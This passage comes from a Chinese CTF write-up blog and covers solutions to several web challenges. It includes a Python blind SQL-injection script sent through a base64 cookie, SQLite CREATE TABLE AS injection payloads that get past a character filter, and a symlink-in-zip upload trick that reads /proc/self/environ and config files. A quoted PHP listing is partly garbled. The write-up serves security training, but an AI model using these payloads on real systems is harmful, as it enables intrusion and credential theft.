<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params"><span class="variable">$pluginName</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_plugins</span>[<span class="string">&#x27;activated&#x27;</span>][<span class="variable">$pluginName</span>] = <span class="built_in">self</span>::<span class="variable">$_tmp</span>;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_tmp</span> = <span class="keyword">array</span>();</span><br><span class="line">    Helper::addRoute(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以来到<code>/page_admin</code>，带上 admin 参数来输出 session 即可得到 flag</p>
<h2 id="BSidesCF-2019-Sequel"><a href="#BSidesCF-2019-Sequel" class="headerlink" title="[BSidesCF 2019]Sequel"></a>[BSidesCF 2019]Sequel</h2><p>爆破，账号密码都是guest,登入后，抓包，cookie进行base64解密</p>
<p><img src="https://img.npfs06.top/20210313194712.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>然后构造一个新的{“username”:“guest” or “A”=“A”,“password”:“guest”}，将其转化为base64编码并发包，发现成功登陆</p>
<p>paylaod:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://cc9386c2-1cc2-41cf-9d8c-c6f7a41a1e4a.node3.buuoj.cn/sequels&#x27;</span></span><br><span class="line">LETTERS = string.printable</span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    f = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> LETTERS:</span><br><span class="line">        tmp = target + e</span><br><span class="line">        <span class="comment"># 1.テーブル名を取得</span></span><br><span class="line">        <span class="comment">#payload = r&#x27;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT name FROM sqlite_master limit 0,1),&#123;&#125;,1)=\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#x27;.format(len(tmp), e)</span></span><br><span class="line">        <span class="comment"># 2.usernameを取得</span></span><br><span class="line">        <span class="comment"># payload = r&#x27;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT username FROM userinfo limit 1,1),&#123;&#125;,1)=\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#x27;.format(len(tmp),e)</span></span><br><span class="line">        <span class="comment"># 3.passwordを取得</span></span><br><span class="line">        payload = <span class="string">r&#x27;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT password FROM userinfo limit 1,1),&#123;&#125;,1)=\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(tmp),e)</span><br><span class="line">        payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        req = requests.Request(</span><br><span class="line">            <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            URL,</span><br><span class="line">            params=&#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">&quot;1337_AUTH&quot;</span>: payload</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        prepared = req.prepare()</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        r = s.send(prepared, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Movie&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target = tmp</span><br><span class="line">            print(target)</span><br><span class="line">            f = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f: <span class="keyword">continue</span></span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>
<p>username: <code>sequeladmin</code></p>
<p>password<code>f5ec3af19f0d3679e7d5a148f4ac323d</code></p>
<p>登录，即可得到flag</p>
<p><img src="https://img.npfs06.top/20210313193843.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>最后再附上一张sqlite_master</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sqlite_master ( </span><br><span class="line">	type TEXT, </span><br><span class="line">	name TEXT, </span><br><span class="line">	tbl_name TEXT, </span><br><span class="line">	rootpage <span class="type">INTEGER</span>, </span><br><span class="line">	<span class="keyword">sql</span> TEXT </span><br><span class="line">); </span><br></pre></td></tr></table></figure>


<h2 id="Zer0pts2020-phpNantokaAdmin"><a href="#Zer0pts2020-phpNantokaAdmin" class="headerlink" title="[Zer0pts2020]phpNantokaAdmin"></a>[Zer0pts2020]phpNantokaAdmin</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//utip.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">  header(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$path</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flash</span>(<span class="params"><span class="variable">$message</span>, <span class="variable">$path</span> = <span class="string">&#x27;?page=index&#x27;</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;flash&#x27;</span>] = <span class="variable">$message</span>;</span><br><span class="line">  redirect(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> htmlspecialchars(<span class="variable">$string</span>, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// comment out, calling function...</span></span><br><span class="line">    <span class="string">&quot;[\&quot;#&#x27;()*,\\/\\\\`-]&quot;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;util.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$method</span> = (<span class="keyword">string</span>) (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] ?? <span class="string">&#x27;GET&#x27;</span>);</span><br><span class="line"><span class="variable">$page</span> = (<span class="keyword">string</span>) (<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ?? <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$page</span>, [<span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;create&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>])) &#123;</span><br><span class="line">  redirect(<span class="string">&#x27;?page=index&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;flash&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;flash&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$page</span>, [<span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;database&#x27;</span>])) &#123;</span><br><span class="line">  flash(<span class="string">&quot;Please create database first.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;database&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:db/&#x27;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">  <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;SELECT name FROM sqlite_master WHERE type=&#x27;table&#x27; AND name &lt;&gt; &#x27;&quot;</span> . FLAG_TABLE . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>);</span><br><span class="line">  <span class="variable">$table_name</span> = <span class="variable">$stmt</span>-&gt;fetch(PDO::FETCH_ASSOC)[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;PRAGMA table_info(`<span class="subst">&#123;$table_name&#125;</span>`);&quot;</span>);</span><br><span class="line">  <span class="variable">$column_names</span> = <span class="variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;insert&#x27;</span> &amp;&amp; <span class="variable">$method</span> === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable">$values</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;values&#x27;</span>];</span><br><span class="line">  <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;INSERT INTO `<span class="subst">&#123;$table_name&#125;</span>` VALUES (?&quot;</span> . str_repeat(<span class="string">&#x27;,?&#x27;</span>, count(<span class="variable">$column_names</span>) - <span class="number">1</span>) . <span class="string">&quot;)&quot;</span>);</span><br><span class="line">  <span class="variable">$stmt</span>-&gt;execute(<span class="variable">$values</span>);</span><br><span class="line">  redirect(<span class="string">&#x27;?page=index&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;create&#x27;</span> &amp;&amp; <span class="variable">$method</span> === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;database&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;table_name&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;columns&#x27;</span>])) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Parameters missing.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$table_name</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;table_name&#x27;</span>];</span><br><span class="line">  <span class="variable">$columns</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;columns&#x27;</span>];</span><br><span class="line">  <span class="variable">$filename</span> = bin2hex(random_bytes(<span class="number">16</span>)) . <span class="string">&#x27;.db&#x27;</span>;</span><br><span class="line">  <span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:db/&#x27;</span> . <span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_valid(<span class="variable">$table_name</span>)) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Table name contains dangerous characters.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (strlen(<span class="variable">$table_name</span>) &lt; <span class="number">4</span> || <span class="number">32</span> &lt; strlen(<span class="variable">$table_name</span>)) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Table name must be 4-32 characters.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (count(<span class="variable">$columns</span>) &lt;= <span class="number">0</span> || <span class="number">10</span> &lt; count(<span class="variable">$columns</span>)) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Number of columns is up to 10.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE <span class="subst">&#123;$table_name&#125;</span> (&quot;</span>;</span><br><span class="line">  <span class="variable">$sql</span> .= <span class="string">&quot;dummy1 TEXT, dummy2 TEXT&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$columns</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$column</span> = (<span class="keyword">string</span>) (<span class="variable">$columns</span>[<span class="variable">$i</span>][<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable">$type</span> = (<span class="keyword">string</span>) (<span class="variable">$columns</span>[<span class="variable">$i</span>][<span class="string">&#x27;type&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_valid(<span class="variable">$column</span>) || !is_valid(<span class="variable">$type</span>)) &#123;</span><br><span class="line">      flash(<span class="string">&#x27;Column name or type contains dangerous characters.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$column</span>) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen(<span class="variable">$column</span>) || strlen(<span class="variable">$type</span>) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen(<span class="variable">$type</span>)) &#123;</span><br><span class="line">      flash(<span class="string">&#x27;Column name and type must be 1-32 characters.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> .= <span class="string">&#x27;, &#x27;</span>;</span><br><span class="line">    <span class="variable">$sql</span> .= <span class="string">&quot;`<span class="subst">$column</span>` <span class="subst">$type</span>&quot;</span>;</span><br><span class="line"><span class="number">4</span><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;delete&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">  session_destroy();</span><br><span class="line">  redirect(<span class="string">&#x27;?page=index&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;index&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;database&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;SELECT * FROM `<span class="subst">&#123;$table_name&#125;</span>`;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$stmt</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">    session_destroy();</span><br><span class="line">    redirect(<span class="string">&#x27;?page=index&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_NUM);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>从 index.php 中可以看到，flag作为一个表存储在每个创建的数据库中，这个表具有未知的表名和列名</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pdo</span>-&gt;query(<span class="string">&#x27;CREATE TABLE `&#x27;</span> . FLAG_TABLE . <span class="string">&#x27;` (`&#x27;</span> . FLAG_COLUMN . <span class="string">&#x27;` TEXT);&#x27;</span>);</span><br><span class="line"> <span class="variable">$pdo</span>-&gt;query(<span class="string">&#x27;INSERT INTO `&#x27;</span> . FLAG_TABLE . <span class="string">&#x27;` VALUES (&quot;&#x27;</span> . FLAG . <span class="string">&#x27;&quot;);&#x27;</span>);</span><br><span class="line"> <span class="variable">$pdo</span>-&gt;query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
<p>在 index.php 中创建表时，显然存在带有表名、列名和列类型的 SQL 注入。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;INSERT INTO `<span class="subst">&#123;$table_name&#125;</span>` VALUES (?&quot;</span> . str_repeat(<span class="string">&#x27;,?&#x27;</span>, count(<span class="variable">$column_names</span>) - <span class="number">1</span>) . <span class="string">&quot;)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;execute(<span class="variable">$values</span>);</span><br></pre></td></tr></table></figure>
<p>不幸的是，这些参数受到长度过滤以及<code>is _ valid</code> 函数过滤，这是在 util.php 中定义的。</p>
<p>让我们检查可用字符。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat test.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> is_valid(<span class="variable">$string</span>) &#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    // comment out, calling <span class="keyword">function</span>...</span><br><span class="line">    <span class="string">&quot;[\&quot;#&#x27;()*,\\/\\\\`-]&quot;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = 0x20; <span class="variable">$i</span> &lt; 0x7f; <span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="variable">$c</span> = chr(<span class="variable">$i</span>);</span><br><span class="line">  <span class="keyword">if</span> (is_valid(<span class="variable">$c</span>)) &#123;</span><br><span class="line">    <span class="variable">$res</span> .= <span class="variable">$c</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$res</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$ php test.php</span><br><span class="line"> !$%&amp;+.0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz&#123;|&#125;~</span><br></pre></td></tr></table></figure>
<p><code>[</code>和<code>]</code>是可用的,我们在使用sqlite语法的时候列名是可以加方括号的，是为了和mysql语法兼容。例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> [<span class="keyword">sql</span>] <span class="keyword">from</span> sqlite_master;</span><br></pre></td></tr></table></figure>
<p>select的时候，当列名用空白字符隔开时，sqlite只会把空格之前的字符当做列名，并且忽视空格后的字符</p>
<p><img src="https://img.npfs06.top/20210314210748.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>而  “ ‘ ` [] 都可以正常包裹列名：</p>
<p><img src="https://img.npfs06.top/20210314211650.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>此外，SQLite 还有 CREATE TABLE… AS 语句，可用于从另一个表创建表。创建表时可以不用带括号。例如：</p>
<p><img src="https://img.npfs06.top/20210314210648.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>关键代码如下：<br><img src="https://img.npfs06.top/20210314211541.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>sql语句大致是这样的</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">CREATE TABLE $table_name (dummy1 <span class="built_in">TEXT</span>, dummy2 <span class="built_in">TEXT</span>, `$<span class="built_in">column</span>` $<span class="built_in">type</span>);</span><br></pre></td></tr></table></figure>
<p>输入<br><code>table_name=[aaa] as select [sql][&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=2</code></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">CREATE</span> TABLE [aaa] <span class="keyword">as</span> <span class="keyword">select</span> [sql][ (dummy1 TEXT, dummy2 TEXT, <span class="symbol">`]from sqlite_master;`</span> <span class="number">2</span>);&quot;;</span><br></pre></td></tr></table></figure>
<p>等于</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [aaa] <span class="keyword">as</span> <span class="keyword">select</span> <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master</span><br><span class="line">查找sqlite_master中<span class="keyword">sql</span>列的值放入aaa表中</span><br></pre></td></tr></table></figure>
<p>得到数据库名和字段名</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">CREATE</span> TABLE `flag_bf<span class="number">1811</span>da` (`flag_<span class="number">2</span>a<span class="number">2</span>d<span class="number">04</span>c<span class="number">3</span>` TEXT)</span><br></pre></td></tr></table></figure>
<p>继续读取</p>
<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">table_name=<span class="comment">[aaa]</span>as select <span class="comment">[flag_2a2d04c3]</span><span class="comment">[&amp;columns<span class="comment">[0]</span><span class="comment">[name]</span>=]</span>from flag_bf1811da;&amp;columns<span class="comment">[0]</span><span class="comment">[type]</span>=2</span><br><span class="line">$sql = <span class="string">&quot;CREATE TABLE <span class="subst">[aaa]</span> as select <span class="subst">[flag_2a2d04c3]</span><span class="subst">[ (dummy1 TEXT, dummy2 TEXT, `]</span>from flag_bf1811da;` 2);&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>等于</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">create</span> table aaa as select flag_<span class="number">2</span>a<span class="number">2</span>d<span class="number">04</span>c<span class="number">3</span> from flag_bf<span class="number">1811</span>da</span><br></pre></td></tr></table></figure>




<h2 id="HCTF-2018-Hideandseek"><a href="#HCTF-2018-Hideandseek" class="headerlink" title="[HCTF 2018]Hideandseek"></a>[HCTF 2018]Hideandseek</h2><p>只有登录功能有用，没有注册功能，简单测试一下登录功能，发现随便输用户名和密码，都能以输入的用户名登录，除了admin之外,猜想是要通过某种方式使用admin登录获取flag。登录之后，来到一个上传页面。</p>
<p>发现需要上传zip，上传了一个1.txt的文件，页面会返回文件里的内容，这时猜想是否可以进行任意文件读取</p>
<p>这里利用软连接进行文件读取</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">这里先科普一下Linux的几个命令</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. ln</span><br><span class="line">功能：</span><br><span class="line">连接文件或目录。为某一个文件在另外一个位置建立一个同步的链接。当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。</span><br><span class="line"></span><br><span class="line">可分为硬连接和符号连接</span><br><span class="line"><span class="selector-attr">[硬链接]</span></span><br><span class="line">只能引用同一文件系统中的文件。它引用的是文件在文件系统中的物理索引（也称为 inode）。</span><br><span class="line">当您移动或删除原始文件时，硬链接不会被破坏，因为它所引用的是文件的物理数据而不是文件在文件结构中的位置。</span><br><span class="line">硬链接的文件不需要用户有访问原始文件的权限，也不会显示原始文件的位置，这样有助于文件的安全。</span><br><span class="line">如果您删除的文件有相应的硬链接，那么这个文件依然会保留，直到所有对它的引用都被删除。</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[符号链接]</span></span><br><span class="line">符号链接 是一个指针，指向文件在文件系统中的位置。</span><br><span class="line">符号链接可以跨文件系统，甚至可以指向远程文件系统中的文件。</span><br><span class="line">符号链接只是指明了原始文件的位置，用户需要对原始文件的位置有访问权限才可以使用链接。如果原始文件被删除，所有指向它的符号链接也就都被破坏了。</span><br><span class="line">它们会指向文件系统中并不存在的一个位置。</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[使用方法]</span></span><br><span class="line"><span class="comment">//硬链接</span></span><br><span class="line">ln <span class="selector-tag">a</span><span class="selector-class">.txt</span> <span class="selector-tag">b</span>.txt</span><br><span class="line"><span class="comment">//符号链接</span></span><br><span class="line">ln -s <span class="selector-tag">a</span><span class="selector-class">.txt</span> <span class="selector-tag">b</span>.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. zip</span><br><span class="line">功能：用于压缩文件</span><br><span class="line"></span><br><span class="line">-y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效</span><br><span class="line"></span><br><span class="line">将 /home/html/ 这个目录下所有文件和文件夹打包为当前目录下的 <span class="selector-tag">html</span>.zip：</span><br><span class="line">zip -<span class="selector-tag">q</span> -r <span class="selector-tag">html</span><span class="selector-class">.zip</span> /home/html</span><br></pre></td></tr></table></figure>
<p>我们使用如下命令生成软连接</p>
<p><code>ln -s /proc/self/environ passwd</code>，获取系统环境变量,生成一个指向<code>/etc/passwd</code>文件的软链接</p>
<p>然后用<code>zip -y passwd.zip passwd</code>命令压缩，</p>
<p>然后上传，结果如下图，成功读取。</p>
<p><img src="https://img.npfs06.top/20210314215429.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>和前面<code>admin</code>不能登录联系起来，猜测这里可能是要用软链接读取相关文件使得可以用admin身份登录。也就是说是要读取跟admin相关的文件，然后以admin身份登录出flag，那么跟admin相关的文件有什么呢，密码文件肯定不是的，因为这个登录就没用到密码，没用到数据库，那既然没用到数据库，程序怎么知道登录用户身份呢，只能是通过session或cookie。于是看一下页面cookie信息，<code>session=eyJ1c2VybmFtZSI6IjEyMyJ9.Ey-iAg.rmAsie7g8AlN3TSdm9GD9-vTGzI</code>，很像flask的session信息，解密如下</p>
<p><img src="https://img.npfs06.top/20210314222920.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>到这里思路就大致清晰了，我们要用到上传zipfile读取到<code>SECRET_KEY</code>，然后伪造admin的session进行登录。</p>
<p>看了一下之后发现/app/uwsgi.ini这个配置文件，上传zip读取一下</p>
